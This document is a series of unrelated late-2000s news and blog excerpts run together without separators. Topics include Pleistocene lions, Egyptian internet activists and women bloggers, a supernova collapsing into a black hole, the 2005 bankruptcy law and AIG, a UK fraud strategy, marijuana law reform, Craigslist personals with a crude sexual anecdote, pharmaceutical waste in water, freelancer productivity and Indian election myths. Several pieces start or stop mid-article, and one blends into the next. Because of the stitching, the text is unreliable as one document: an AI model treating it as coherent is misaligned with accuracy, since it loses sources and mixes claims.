When a member of the San Francisco ’s transport police shot a man dead on camera earlier this year , the video , placed on YouTube , provoked riots .
Google , the owner of YouTube , provoked a flurry of outrage ( and plenty of benign curiosity ) when it launched Street View in Britain last month , but taking still images of a street every couple of years is even less efficient as a means of surveillance than official CCTV .
An individual with a camera and access to a network is a far greater threat to our privacy , and a far more powerful guardian of our liberty .
Little Brother is watching you , and watching over you .

It is thought the ancient lions would not have had manes Giant lions were roaming around Britain , Europe and North America up to 13,000 years ago , scientists from Oxford University have found .
Remains of giant cats previously discovered were thought to be a species of jaguar or tiger but after DNA analysis they were proved to be lions .
They were 25 % bigger than the species of African lion living today , and had longer legs to chase their prey .
They would have lived in icy tundra with mammoth and sabretooth tigers .
It is thought these animals would hunt over longer distances , and their longer legs would help them chase down their prey as opposed to the modern - day species which tends to ambush its victims .
The Oxford team analysed DNA from fossils and other remains gathered from Germany to Siberia , and Alaska to Wyoming .
Dr Ross Barnett , who conducted the research at Oxford University 's department of Zoology , said : " These ancient lions were like a super - sized version of today 's lions and , in the Americas , with longer legs adapted for endurance running .
" What our genetic evidence shows is that these ancient extinct lions and the lions of today were very closely related .
The extinction is a big question that remains unresolved
Dr Ross Barnett
" Cave art also suggests that they formed prides , although the males in the pictures would not have had manes and they are depicted very realistically . "
Lions appear to have been very important to early man with many depictions of them in their cave paintings , as in seen in the pre-historic cave complex at Chauvet in France .
Other archaeological finds in Germany include figurines which are half man , half lion , leading to the theory that lions may even have been worshipped by ancient humans .
The team found that these remains from the Pleistocene Epoch ( 1.8 million years ago to 10,000 years ago ) could be divided into two groups : the American Lion which lived in North America , and the Cave Lion which lived in northern Europe , Russia , Alaska and the Yukon .
These ancient cats would have lived in an environment that was more like an icy tundra and would have shared their habitat with herds of other large animals such as mammoth , woolly rhino , sabre tooth tigers and giant deer .
About 13,000 years ago these species died out in a mass extinction .
Figuring out the reason behind this , Dr Barnett said , was one of the last great scientific mysteries .
He said : " There are a couple of different schools of thought .
It could have been climate change or something to do with humans .
Humans could have been killing off their prey or killing the lions themselves .
" The extinction is a big question that remains unresolved .
More research and more advanced genetic analysis may help answer it . "

The official trailer for Universal Pictures ' Public Enemies .
In the action - thriller Public Enemies , acclaimed filmmaker Michael Mann directs Johnny Depp , Christian Bale and Academy Award® winner Marion Cotillard in the incredible and true story of legendary Depression - era bank robber John Dillinger ( Depp ) the charismatic bank robber whose lightning raids made him the number one target of J. Edgar Hoovers fledgling FBI and its top agent , Melvin Purvis ( Bale ) , and a folk hero to much of the downtrodden public .
No one could stop Dillinger .
No jail could hold him .
His charm and audacious jailbreaks endeared him to almost everyonefrom his girlfriend Billie Frechette ( Cotillard ) to an American public who had no sympathy for the banks that had plunged the country into the Depression .
But while the adventures of Dillinger 's ganglater including the sociopathic Baby Face Nelson ( Stephen Graham ) thrilled many , Hoover ( Billy Crudup ) hit on the idea of exploiting the outlaw 's capture as a way to elevate his Bureau of Investigation into the national police force that became the FBI .
He made Dillinger America 's first Public Enemy Number One .
Hoover sent in Purvis , the dashing " Clark Gable of the FBI " .
However , Dillinger and his gang outwitted and outgunned Purvis ' men in wild chases and shootouts .
Only after importing a crew of Western ex-lawmen ( newly baptized as agents ) who were real gunfighters and orchestrating epic betrayals from the infamous " Lady in Red " to the Chicago crime boss Frank Nittiwere Purvis and the FBI able to close in on Dillinger .
( Updates after release )
CAIRO , March 3 ( Reuters ) - Egyptian security authorities on Tuesday released an Internet activist who belongs to an anti-government protest group , a day after he was detained at his home , a security official and a human rights group said .
Bloggers and human rights activists said security agents seized Rami al - Sweisy , a member of the Sixth of April Youth , along with his computer , mobile phone and wallet .
It was the third detention in less than a month of an Internet activist in Egypt and came as the movement called for a national day of protest on April 6 , the anniversary of clashes between police and workers in a Nile Delta textile town in 2008 .
" He was released today , " said Gamal Eid , head of the Arabic Network for Human Rights Information .
" He is a bit shaken " .
Egyptian authorities have escalated tactics against bloggers and Web activists in recent weeks even as the government freed opposition politician Ayman Nour , one of its most prominent critics .
Nour 's release had long been demanded by Washington .
Last month , security men detained Egyptian - German activist Philip Rizk and blogger Diaa Eddin Gad , who campaign for Palestinians in the Gaza Strip .
They held both incommunicado .
Rizk was freed after several days after an international outcry .
Gad remains held in an unknown location .
Rights group Amnesty International said he was at risk of torture .
Eid said interrogators tried to convince Sweisy to leave the left - leaning Sixth of April Youth , formed after April 6 clashes in the Nile Delta town of Mahalla el - Kubra between police and workers demanding more pay to compensate for soaring inflation .
Three people were killed and more than 150 injured over two days of unrest in Mahalla , the culmination of more than a year of strikes by workers at a giant state - run textile factory .
Sixth of April Youth has since transformed into a more general anti-government movement , collecting members through the social networking site Facebook , which along with blogs has emerged as a major forum for government critics in Egypt .
The government has faced rising public anger over its enforcement of a blockade on the Hamas - run Gaza Strip , especially since an Israeli offensive in Gaza in January .
Separately , the Egyptian government detained 15 members of the opposition Muslim Brotherhood on Tuesday over accusations of belonging to an illegal group and possessing anti-government literature , security sources said .

In the first observation if its kind , scientists at the Weizmann Institute of Science and San Diego State University were able to watch what happens when a star the size of 50 suns explodes .
As they continued to track the spectacular event , they found that most of the star ’s mass collapsed in on itself , resulting in a large black hole .
While exploding stars – supernovae – have been viewed with everything from the naked eye to high - tech research satellites , no one had directly observed what happens when a really huge star blows up .
Dr. Avishay Gal - Yam of the Weizmann Institute ’s Faculty of Physics and Prof. Douglas Leonard of San Diego State University recently located and calculated the mass of a gigantic star on the verge of exploding , following through with observations of the blast and its aftermath .
Their findings , reported in the journal Nature , have lent support to the reigning theory that stars ranging from tens to hundreds of times the mass of our sun all end up as black holes .
A star ’s end is predetermined from birth by its size and by the ‘ power plant ’ that keeps it shining during its lifetime .
Stars , among them our sun , are fueled by hydrogen nuclei fusing together into helium in the intense heat and pressure of their inner cores .
A helium nucleus is a bit lighter than the sum of the masses of the four hydrogen nuclei that went into making it and , from Einstein ’s theory of relativity ( E=mc2 ) , we know that the missing mass is released as energy .
When stars like our sun finish off their hydrogen fuel , they burn out relatively quietly in a puff of expansion .
But a star that ’s eight or more times larger than the sun makes a much more dramatic exit .
Nuclear fusion continues after the hydrogen is exhausted , producing heavier elements in the star ’s different layers .
When this process progresses to the point that the core of the star has turned to iron , another phenomenon takes over :
In the enormous heat and pressure in the star ’s center , the iron nuclei break apart into their component protons and neutrons .
At some point , this causes the core and the layer above it to collapse inward , firing the rest of the star ’s material rapidly out into space in a supernova flash .
A supernova releases more energy in a few days than our sun will release over its entire lifetime , and the explosion is so bright that one occurring hundreds of light years away can be seen from Earth even in the daytime .
While a supernova ’s outer layers are lighting up the universe with dazzling fireworks , the star ’s core collapses further and further inward .
The gravity created in this collapse becomes so strong that the protons and electrons are squeezed together to form neutrons , and the star ’s core is reduced from a sphere 10,000 kilometers around to one with a circumference of a mere 10 kilometers .
Just a crate - full of this star ’s material weighs as much as our entire Earth .
But when the exploding star is 20 times the mass of our sun or more , say the scientists , its gravitational pull becomes so powerful that even light waves are held in place .
Such a star – a black hole – is invisible for all intents and purposes .
Until now , none of the supernovae stars that scientists had managed to measure had exceeded a mass of 20 suns .
Gal - Yam and Leonard were looking at a specific region in space using the Keck Telescope on Mauna Kea in Hawaii and the Hubble Space Telescope : supernova SN 2005gl , which was originally seen in the barred - spiral galaxy NGC 266 on October 5 , 2005 .
( Pre-explosion pictures from the Hubble archive , taken in 1997 , reveal the progenitor as a very luminous point source . )
Identifying the about - to - explode star , they calculated its mass to be equal to 50 - 100 suns .
Continued observation revealed that only a small part of the star ’s mass was flung off in the explosion .
Most of the material , says Gal - Yam , was drawn into the collapsing core as its gravitational pull mounted .
Indeed , in subsequent telescope images of that section of the sky , the star seems to have disappeared .
In other words , the star has now become a black hole – so dense that light ca n’t escape .
Dr. Avishai Gal - Yam ’s research is supported by the Nella and Leon Benoziyo Center for Astrophysics ; the Peter and Patricia Gruber Award ; the Legacy Heritage Fund ; and the William Z. and Eda Bess Novick Young Scientist Fund .
I ’m sure the knowledgeable people already know this .
But it turns out that one of the features of the 2005 Bankruptcy bill was to put derivative counter parties at the front of the line ahead of other creditors in bankruptcy proceedings .
Actually , from what I can tell , they do n’t just go to the head of the line .
They got to skip the line entirely .
As the Financial Times noted last fall , “ the 2005 changes made clear that certain derivatives and financial transactions were exempt from provisions in the bankruptcy code that freeze a failed company ’s assets until a court decides how to apportion them among creditors . ”
As the article notes , ironically , this provision which Wall Street pushed for and got to protect investment banks actually ended up hastening the collapse of Lehman and Bear Stearns last year .
Down in the article there are also the mentions of the entertainingly named “ International Swaps and Derivatives Association “ , one of the lobbies that helped get the change in place .
Along these lines , TPM Reader GG sent in this last night …
Respectfully , you guys are totally misunderstanding something crucial in the AIG bailout : Derivatives claims are not stayed in bankruptcy .
( Yet another brilliant innovation from the 2005 bankruptcy reform legislation . )
If AIG were to go down , derivatives counterparties would be able to seize cash / collateral while other creditors and claimants would have to stand by and wait .
Depending on how aggressive the insurance regulators in the hundreds of jurisdictions AIG operates have been , the subsidiaries might or might not have enough cash to stay afloat .
If policyholders at AIG and other insurance companies started to cancel / cash in policies , there would definitely not be enough cash to pay them .
Insurers would be forced to liquidate portfolios of equities and bonds into a collapsing market .
In other words , I do n’t think the fear was so much about the counterparties as about the smoking heap of rubble they would leave in their wake .
Additionally , naming AIG ’s counterparties without knowing / naming those counterparties ’ counterparties and clients would be at best useless , and very likely dangerous .
Let ’s say Geithner acknowledges that Big French Bank is a significant AIG counterparty .
( Likely , but I have no direct knowledge . )
BFB then issues a statement confirming this , but stating it was structuring deals for its clients , who bear all the risk on the deals , and who it ca n’t name due to confidentiality clauses .
Since everyone knows BFB specialized in setting up derivatives transactions for state - affiliated banks in Central and Eastern Europe , these already wobbly institutions start to face runs .
In some cases this leads to actual riots in the streets , especially since the governments there do n’t have the reserves to help out .
If you ’re Tim Geithner , do you risk it ?
Or do you grit your teeth and let a bunch of senators call you a scumbag for a few more hours ?
I ’d be curious to hear what other knowledgeable readers think about this .
But separate from the immediate financial implications related to AIG , it does point us toward the larger political economy point : the self - reinforcing cycle in which financialization leads to vast sums of money concentrated in the hands of paper - jobbers , who then mobilize that money in Washington to rewrite the laws to privilege them for even greater profits .
A final question , I ’d be curious to hear from people who work in this space what even the notional rationale would be for having derivative counter parties able to skip the line in a bankruptcy proceeding .
A UK government strategy for tackling internet fraud has been criticised by a senior banking security researcher .
The UK's first National Fraud Strategy , launched on Thursday , aims to crack down on fraud that costs Britain £ 14bn a year , by " strengthening the counter - fraud community ’s response to their activities and providing real help , protection and support to individual consumers and businesses " .
The three - year strategy has four key aims :
Improving the building and sharing of knowledge about fraud , through establishing a new National Fraud Reporting Centre and National Fraud Intelligence Bureau , under the City of London Police
Tackling the most serious fraud threats , such as identify theft
Disrupting and punishing more fraudsters while improving support to their victims
Improving the nation ’s long - term capability to prevent fraud
Ross Anderson , professor in security engineering at the University of Cambridge , said that the proposal to allow the new National Fraud Reporting Centre to sit alongside the banking industry funded Dedicated Cheque and Plastic Crime Unit within the City of London police is an arrangement " more worthy of Uzbekistan than of Britain " .
Anderson , one of the world 's foremost experts on banking security , writes : " You have to ask how eager the City force will be to investigate offences that bankers do n’t want investigated , such as the growing number of insider frauds and chip card cloning ?
And how vigorously will City cops investigate their paymasters for the fraud of claiming that their systems are secure , when they ’re not , in order to avoid paying compensation to defrauded account holders ?
" The purpose of the old system was to keep the fraud figures artificially low while enabling the banks to control such investigations as did take place .
And what precisely has changed ?
" The lessons of the credit crunch just do n’t seem to have sunk in yet .
The Government just ca n’t kick the habit of kowtowing to bankers . "
The Cambridge don adds that the creation of the new National Fraud Reporting Centre , to be run by the City of London Police , is " presumably intended to defuse the Lords ’ criticisms of the current system whereby fraud must be reported to the banks , not to the police " .
Cambridge security researchers , led by Anderson , have consistently argued that the business model for banks consistently transfers liability for fraud on customers , through unfair terms and conditions and " false claims about system security " .
" This is a regulatory failure : the FSA has been just as gullible in accepting the banking industry ’s security models as they were about accepting its credit - risk models , " he writes .
Anderson is well known in the UK for testifying in cases about " phantom withdrawals " from bank accounts , arguing against the frequent insistence of banks that its systems are foolproof and that any contested withdrawals must therefore be the fault of customers .
His thoughts on the UK's new strategy for tackling cybercrime can be found here . ®

In a recent town hall meeting , President Obama , when asked about the legalization of marijuana , nervously laughed and briefly dismissed the idea , which had been advanced as a way to help pull out of our current economic doldrums .
In doing so , the President was following conventional wisdom when it comes to marijuana -- that to openly support reform or repeal of harsh anti-pot laws is tantamount to political suicide .
The President 's nervousness around this touchy issue -- particularly in view of his admitted youthful marijuana use -- is completely understandable .
But I do n't think it 's news to anyone that the political landscape is changing , and changing rapidly .
Especially when it comes to marijuana , there is a huge shift underway in public perception -- one that will eventually and inevitably result in legalization .
We are nearing that tipping point .

Olympic swimming star Michael Phelps ' recent indiscretion is one of the catalysts that propelled marijuana to the front burner .
( In case you 've been under a rock , Phelps was photographed hitting a marijuana bong at a party . )
The marijuana community united in support of Phelps when he was unceremoniously dumped by corporate sponsor Kellogg 's , and beyond that , a lot of people who had n't given much thought to marijuana suddenly were wondering , " Hmm ...
If pot is really so bad , then how did Michael Phelps win all those gold medals ? "
But there 's a lot more to the story than that .
The issue of marijuana law reform deserves serious consideration , because it has a big impact on both individual lives and families , and on law enforcement priorities and budgets , along with overcrowded jails and prisons .
No Time To Wait
( Image by Unknown Owner ) Details DMCA
I 've seen the idea batted around that perhaps the President is biding his time .
According to this line of thought , " controversial " things like marijuana reform will have to wait until Obama 's presumed second term , when American presidents have traditionally dealt with issues that otherwise might have come back to haunt them when they ran for re-election .
I think of myself as a patient man , but there 's more to this scenario than patiently waiting for politicians to lead .
Most important is the fact that , contrary to what many believe , lots of people are still being busted for pot .
In 2007 , more than 872,000 ( ! ) people were arrested for marijuana -- an all - time high .
The vast majority of those cases -- 775,000 -- were for simple possession .
If we 're supposed to wait four more years for marijuana law reform , that means , at current rates , almost 3.5 million more Americans will have been arrested for marijuana before anything changes .
More than 3 million of those arrests will have been for possession alone .
That 's just unacceptable .
Opponents of the war on marijuana -- or the " marijuana vote , " if you will -- voted overwhelmingly for Obama in last November 's election .
While most of us are under no illusion that we 'll receive any special treatment , what we do ask is to at least be taken seriously .
We believe that the issues of privacy , the erosion of civil liberties , jail and prison overcrowding , and civil forfeiture are crucially serious -- and the war on marijuana and its users directly and hugely impacts all of these concerns .
But while all of these issues are serious to any caring , informed citizen , none of them has the immediate and visceral impact of the most important issue of all :
We believe it is wrong to jail people for using marijuana .
Period .
The punishment just does n't fit the supposed " crime . "
The United States already has a higher proportion of its population behind bars than any nation on Earth .
Forget Russia , China , North Korea , and Iran ; we 've got them all beat , when it comes to keeping people in cages .
Do we really need to exacerbate this problem by locking up people for pot ?

Banat wa Bas is not afraid to let contributors express their views
From the BBC Arabic Service
Young Egyptian women are using blogs and online radio stations to beat the censors and to fight for equality .
Despite making up only 24 % of the workforce in Egypt , 30 % of women use the internet .
But it is the middle and upper classes that have really taken to the internet as an alternative way to discuss topics and exchange information and air what many conservatives would consider to be radical views .
Often exploiting the anonymity afforded by the internet they tell personal stories , share political and cultural views , post favourite pictures , and talk about their daily frustrations .
What can I do ?
Egyptian blogger Dalia Ziada called on Saudi Arabia to end what she considers discrimination against young Muslim women , in a campaign timed to coincide with the Prophet Muhammad 's birthday .
" I am not allowed to do Omra [ a lesser pilgrimage to Mecca ] !
Why ?
Because I am a young woman under the age of 45 !
The only solution for me to get to my beloved Prophet 's land is to be accompanied by a male chaperone .
My mother is not enough ! ! " says Dalia .
My blog is a way to remind myself that I am not alone
Anonymous blogger " Do you know what a male chaperone is ?
A first - degree male relative : father , brother , husband , or son !
I am in a big trouble , then .
" My father is dead , my two brothers are not interested and I cannot afford to pay for their tickets .
I do not have a husband and of course I do not have a son !
What can I do , now ? " she says .
Obsession with virginity Another blogger who wanted to remain anonymous , writes about her past as a drug addict and has criticised what she calls Arab society 's " continuing obsession with female virginity .
" My blog is a way to remind myself that I am not alone , Even if no one reads it , I would still keep writing , " she says .
Another significant way in which the blogosphere is being used to change Egyptian society is that it is one of the few public spaces in Egypt where men and women are represented more - or - less equally .
It makes collaboration on social issues possible between men and women .
Subjects that are taboo on the street can be discussed online .
They discuss issues such as sexual harassment , which is often pigeon - holed in Egypt as a " woman 's problem " .
Radical radio Egyptian women are also putting themselves on the map of audio blogging , which is a cheap and censorship - free growing web trend .
If you are always at risk of being sexually harassed , what kind of life is this ?
Amani Tunsi
Banat wa Bas or " Girls only " is the first online Arabic radio station entirely run by women and which addresses their issues .
It is one of a growing list of online stations that have sprung up in Egypt including Horytna ( Our Freedom ) and Teet ( an Arabic reference to the censor 's " beep " ) .
Banat wa Bas was started by a 25 - year - old computer science graduate , Amani Tunsi , who was frustrated with how women are treated in Egyptian society .
" We are almost not living .
If you are always at risk of being sexually harassed everywhere , What kind of life is this ?
" she asks .
Banat wa Bas currently offers listeners a variety of shows , including Mosh Kol al - Teir , which is an Egyptian proverb ( " Not all the Birds " ) to say not all girls are easy to fool .
The show revolves around the tricks used by Egyptian men to pick up women .
Banat wa Bas is not afraid to let its contributors express opinions about what is in the news , and they can get away with it because using the internet means they can steer clear of government censorship .

In an exploration of the Casual Encounters world , more than 100 e-mail messages were sent to users requesting interviews before the recent murders .
About a dozen frequent users , mostly men , consented to phone or e-mail interviews , some of which took place over the past three months .
Two men , Michael and Melvin , were willing to meet with a reporter in person , as long as they were identified only by their name on Craigslist .
A few women who had posted ads were also forthcoming , but none of the women who had replied to Michael ’s or Melvin ’s ads consented to an interview .
Ads in the Casual Encounters section account for 2 percent of all Craigslist postings , according to the company .
It also says that traffic to all the Craigslist personals sites  which include a separate one for romance and one for “ missed connections , ” where people try to find the cutie they flirted with on the L train  is higher than for any other online personals site , including Match.com , eHarmony and Yahoo personals .
“ Casual Encounters was created in response to user demand for a section that allowed for a wide range of personal meeting and relationship options , ” Craig Newmark , the founder of Craigslist , said by e-mail message before the recent murders took place .
“ In that sense , it ’s probably an accurate inside look at how people like to connect these days .
Our users like the ability to be both candid and , initially , anonymous . ”
Within Casual Encounters , the most traditional of the categories  men seeking women  seems to raise the most tantalizing questions , given the reasonable assumption that most women ( and even a few men ) would prefer earnest courtship to a quickie with a stranger , no strings attached .
For instance , does it really work ?
The short answer is “ yes . ”
But as with so many things on Craigslist , the truth is a little dingier than what was promised .
Among the stories told by users of Casual Encounters are those about the eager 22 - year - old who turns out to be too shy to go through with it ( and she ’s really 30 ) ; the woman who seems docile by e-mail but who turns violent after smoking a joint ; and the single mother who lies about dropping the children off at their grandmother ’s house for the night .
Stoner Logic
Today , I 've been sleeping with my drug dealer from high school who I still buy pot from for the past week .
He made me go down on him a few days ago and he smelled funny but I did n't say anything .
Today , he told me he only showers 2 - 3 times a month and he thinks he 's a genius for it .

Job losses are in the air and on the soil of the United States .
This could be caused by many many matters : subprime mortgages , Lehman Brothers , Madoff , AIG , GREED !
The list goes on and on .
Where is the moral ?
Where is the positivity ?
Where is the love in a materialized world ?
Nonetheless , love and positivity truly exist in this boy .
Human beings perhaps need not to take things for granted , and start caring for each other like this boy does to his father .
Mr. Mark Gullet was the Vice President - equivalent of Tampa Bay Lightning ’s Marketing Department .
Mr. Gullet was laid off on the 12th of this month .
He has told his son , Ben Gullet , to be prepared for the days coming .
The ride is going to be rough .
However , Ben did not get discouraged by the statement and even made a YouTube video for his father regarding the current situation .
Within 24 hours of being posted on YouTube , the particular video welcomed 800 viewings .
The same video hit 60,000 viewings a few days before this article was written .
Mr. Mark Gullet has actually received numerous call - backs for job interviews .
Wish the Gullets the best to come !
Good things always happen to good people in the long run !
AIG ?
Not so much .
Check this out : White House seeks powers to shut firms like AIG
( Natural News ) The Associated Press ( AP ) estimates that hospitals and long - term medical care institutions across the United States are dumping 250 million pounds of pharmacologically active drugs directly into public sewer systems each year .
Because the government does not require health institutions to keep records on their disposal of pharmaceutical products , there are no definitive numbers on the volume of drugs going into the water supply .
In order to construct an estimate , AP investigators extrapolated from a survey of 14 urban and rural Minnesota hospitals .
Minnesota 's state government strongly encourages health care facilities to keep records of drug disposal .
After adjusting for Minnesota 's relatively low rate of prescription drug use and doubling the number to account for the greater waste typically produced by long - term care facilities , the AP concluded that at least 250 million pounds of drug waste and drug - contaminated packaging are thrown away each year .
This includes expired or spoiled drugs , leftovers from too - large prescriptions , drugs that are prescribed but not needed , drugs that patients refuse to take or that are halted due to negative side effects , or drugs left over when patients die .
The researchers could not determine what proportion of the 250 million pounds consists of packaging , but experts estimate that it may be roughly half .
The vast majority of this waste is disposed of by flushing it down sinks or toilets , according to the Environmental Protection Agency ( EPA ) .
A 2006 survey by a water company of 45 long - term care centers found that roughly two - thirds of drug waste was disposed of through the sewer system .
" Obviously , we 're flushing them - which is not ideal , " said Mary Ludlow of White Oak Pharmacy , a company that works with nursing homes and assisted - living facilities .
This pharmacological waste is much more potent than the drugs that patients flush down their own home toilets , including not only stronger versions of over - the - counter drugs but also highly toxic chemicals like cancer treatments .
Tests of hospital sewers in Oslo and Paris have revealed high concentrations of antibiotics , heart drugs , hormones , painkillers skin medication -- in addition to the well - known high concentrations of bacteria , viruses and other pathogens .
Dumping drugs into water is far from harmless , although the exact nature of the danger remains poorly understood .
But scientists agree that drugs remain pharmacologically active even after disposal , and can have severe effects on humans and wildlife .
Studies of wastewater near hospitals in Europe and the United States have found higher concentrations of antibiotic resistant bacteria and of organisms with genetic mutations similar to those that can cause cancer in humans .
Another study on antibiotics in the fluoroquinolone family , including best - seller ciproflaxin , found that these drugs could cause changes to bacterial DNA .
Even worse , hospitals and long - term care facilities are only two sources of the drugs that , all across the country , are being dumped in large quantities into the water supply .
Vast quantities of unprocessed drugs are excreted by people 's bodies into the sewage system , while other institutions such as small medical and veterinary practices and hospitals at facilities such as prisons are also flushing unmetabolized drugs .
According to Linda Peterson , a nurse at a prison in Oak Park Heights , Minn. , her prison throws out approximately 12,000 pills per year , including antibiotics , heart drugs and narcotics .
" We flush it and flush it and flush it - until we can't see any more pills , " Peterson said .
" So what are [ other ] facilities doing , if we 're throwing away about 700 to 1,000 pills a month ?
" Even after highly diluted with thousands of gallons of water , such drugs remain biologically active .
Early research into the problem suggests that in concentrations equivalent to those found in drinking water across the country - according to AP , a minimum of 46 million people are exposed to such water , with most water still untested - drug residue can cause harm to aquatic species like fish and amphibians .
Laboratory tests confirm that such concentrations also disrupt healthy growth of human cells .
According to pharmacist and researcher Boris Jilibois from the Compiegne Medical Center , there 's enough proof of risk to justify immediate action .
" Something should be done now , " he said .
" It 's just common sense .
" The scale of the problem is so large that the EPA has classified pharmaceutical products as " major pollutants of concern . "
" Treating the toilet as a trash can is n't a good option , " said Ben Grumbles , the agency 's head water administrator .
But the agency has stopped short of imposing regulations on the disposal of such products or their contaminated packaging .
" It 's strange that we have rules about the oil from your car ; you 're not allowed to simply flush it down the sewer , " said U.S. Rep .
Tim Murphy .
" So why do we let these drugs , without any kind of regulation , continue to be flushed away in the water supply ?
" According to Grumbles , the EPA should decide whether to impose some sort of regulations by the end of next year .
One measure that has been suggested is requiring pharmaceutical companies to pay for proper disposal of their products , as financial considerations are a major factor influencing hospitals into simply dumping drugs down the drain .
Incinerating a pound of drugs in a hazardous waste incinerator , for example , costs about $ 2 , compared to 35 cents in a normal trash incinerator .
No one seems to agree , however , what a favorable method of drug disposal would be .
While drugs leach more slowly out of landfills , they do still infiltrate the groundwater over time .
Incinerators destroy drugs more thoroughly , but contribute significantly to air pollution and can even eject trace amounts of pharmaceuticals into the air .
" I do n't think we 're encouraging incineration of anything , " Stephen DiZio of the California Department of Toxic Substances Control said .
" The public outcry would be so great .

Elliott Kosmicki is the founder of GoodPlum.com - a productivity and personal development blog for home business owners .
You can also follow Elliott on Twitter .
You know you can be better .
We all can .
It 's the reason productivity and personal development has made such a surge in recent years .
The time of freelancers , writers , designers and other web workers has exploded , and the need for tools and methods to make them more productive has aligned naturally with that explosion .
Competition is higher than ever for these freelancers , so how do you begin to rise to the top ?
The filling is thick , but becoming more productive can help give you the edge to rise to the top - crust - and still have time for the rest of your life .
Big Problems , Small Solutions
The repercussions of our productivity problems are huge .
Hours of wasted time , less clients and billable hours , not enough time for family and friends - and the list goes on .
These are issues that deserve your full attention and action .
But as big as the problems are , the solutions can start very small .
Find the area you 're lacking in most and implement one solution at a time .
1 . Get it all out
Many freelancers tend to try and plan in their heads .
Thoughts , to - dos , marketing ideas , goals and dreams end up in a big storm of greatness that almost never gets translated to action .
There are so many online tools available today , you really have no reason not to have everything written down , out of your head , so you can become focused on the task at hand .
Mindmeister , my favorite online mind - mapping software , can be easily used to organize all levels of thought and action .
Mind - mapping does n't work for everyone , but if you have n't at least tried it , you 're doing yourself a disservice .
Evernote , the leader in portable notes , can allow you to record thoughts , plans and even images from anywhere .
Available for all operating systems , the web , and iPhone - you no longer have an excuse for forgetting that great idea you had this morning .
A to - do list can be essential for you to stay on task , if you decide to make it part of your method .
My two favorites are Remember The Milk ( RTM ) and Toodledoo .
For something very simple ( but also very customizable if you choose ) try RTM .
For something very powerful out of the box , with several levels of items ( goals , folders , tasks and sub- tasks ) , try Toodledoo .
Both have free versions that are very capable of getting you organized right out of the gate .
2 . Look at each email only once
If you 're one of the many who has hundreds of emails in their inbox , you 're probably losing hours of productive time each week .
Our email - obsessed minds tend to look back over each email in the box every time we check email .
Each glance adds up to wasted seconds , minutes and hours each week .
Every email system , whether it 's Outlook or a webmail system , has tools you can use to become more productive .
I , like many of you , use Gmail .
When you check email ( hopefully not more than once per hour ) , make sure you filter or sort each mail immediately .
Setup tags or folders for email you need to keep or respond to later .
Respond to every email you can right away , then delete or archive it !
If we can reduce the amount of times our eyes and mind need to process a message , your positive productivity will directly be affected .
Setting up automatic filters and sorting can increase your productivity ten - fold .
You can make the experience even more productive by adding some Firefox extensions to manage your email .
3 . Let calls go to voicemail
Some days , the phone seems to ring endlessly - a constant distraction from the work at hand .
I 've found that people really do n't mind leaving a message , as long as you get back to them in a reasonable amount of time .
I 'll typically check and respond to voice mail every 2 hours on a busy day .
This gives me good chunks of work - time in between interruptions .
I am currently using Grandcentral for my phone system and voice mail , though I long for the day Google finally updates and improves the system .
4. Focus and organization for writers
Many of us are bloggers or writers on some level .
Whether it 's the main part of what we do , or a supplement to our other work , staying focused while writing is key .
To block out everything else on my computer while I 'm writing I use WriteRoom for Mac , or Q10 ( free ) for Windows .
These programs give you a full - screen text editor to do nothing but write !
For full or part - time writers - for - hire , there are many resources out there to make you more productive .
For instance , how do you estimate the words you can write for a project ?
Are you factoring in research time , etc. ?
Having a solid method of time / cost calculating can be invaluable for your long - term writing productivity .
5 . Go offline
You can't count on web - apps for everything ( yet ) .
If you 're anything like me , writing things in a notebook to review can make productivity go way up .
Get yourself a nice Moleskine notebook and spend some time each day exporting your mind .
This does n't have to be all business - the point here is to clear your head for more great ideas .
6 . Keep files and resources at arms - reach
There are dozens of resource files that I refer to every day .
Whether it's a product manual , logo image , or a PHP cheat - sheet , having those files everywhere I work is invaluable .
File - syncing apps like Dropbox or Sugarsync , can keep all of your necessary documents current on every computer you use during the day !
Microsoft 's Live Mesh is another tool to try , and who knows what might come of Google 's GDrive this year ...
Delicious or Diigo bookmarks make a great research treasure chest .
We all should be using a social bookmarking service to keep track of useful links .

7. Reflection , then refraction
Most people are able to reflect on the past week and think about the good and bad ... but how we refract that ( alter slightly ) into change for the next week is important as well .
During your weekly review , do n't spend too much time fretting over what you could have done differently - slingshot those thoughts into what you are able to change for the week ahead .
It 's YOUR Solution That Matters
Whatever your system ends up being , get it in place and stick with it .
If it changes , fine , but try to pick methods and tools that work for you right now and try those with full - commitment for at least 30 days before you change something up .
Keep what sticks and lose what does n't .
You 'll soon have a productivity system that is perfect for you , and only you .
What other productivity problems or solutions do you have ?

Do women in India vote according to the wishes of their husbands ?
Do Muslims vote as a community ?
Political scientist Yogendra Yadav examines six myths surrounding the Indian elections .
Women voters outnumber men in many states
A myth is a story or trend that a culture believes to be true .
But it has also taken on the meaning of a popular conception that may have become exaggerated if not downright false .
The reason why there is so much myth making around politics and elections in India is partly because Indians are passionate about politics .
It is also because there is very little hard evidence on political behaviour .
When it comes to politics , anything goes .
Here are the six most popular myths about Indian politics and elections : WOMEN VOTE ACCORDING TO THE WISHES OF THEIR HUSBANDS
It is true that in India , like many democracies , the levels of interest and involvement of women in politics is lower than that of men .
Obviously , if you are less interested in something , you tend you go by somebody else 's advice - in the case of women in India it may be the advice of men in their family .
But we cannot conclude that all - or almost all - women go by whatever their husbands ask them to do and so therefore are not really an independent factor in politics .
For one , the level of involvement of women in politics has risen sharply in the past two decades or so : the turnout of women during polling used to be a good 10 percentage points below the turnout of men ; and now , the gap is barely two to three .
Today , more women turn out to vote than men in many states .
The level of involvement of women in politics has risen sharply Second , if it were true that all women were to follow their men in their voting preference , we would not find any difference in the level of support for different parties among men and women .
But surveys over the past 40 years have consistently shown a difference in levels of support for major political parties among men and women .
Congress , for example , has always got more votes from women than from men since the days of former Prime Minister Indira Gandhi or even earlier .
The Communist Party of India ( Marxist ) in Bengal , the regional Rashtriya Janata Dal ( RJD ) in Bihar , and the AIADMK party in Tamil Nadu led by former actress Jayalalitha , are some of the parties who get more votes from women than from men .
Since the early 1970s , researchers from Delhi's Centre for Developing Societies have asked women voters whose advise they seek while casting their ballots .
The evidence shows that fewer than 50 % of women today go by the advice of their husband or any men in their family .
MUSLIMS VOTE HEAVILY AND AS A BLOC
We simply have no good evidence to prove that Muslims vote more than the majority Hindus .
This perception comes from seeing long queues at polling stations in some Muslim majority urban areas where community voters , especially the poor and women , tend to be very visible .
Research shows that in most elections after 1996 , the turnout of Muslim voters has actually been a little lower than that of Hindus .
The other perception about Muslims voting en bloc has an element of truth .
The perception that Muslims vote en bloc has an element of truth
Any minority community tends to flock together , consult among themselves , and has a great sense of community .
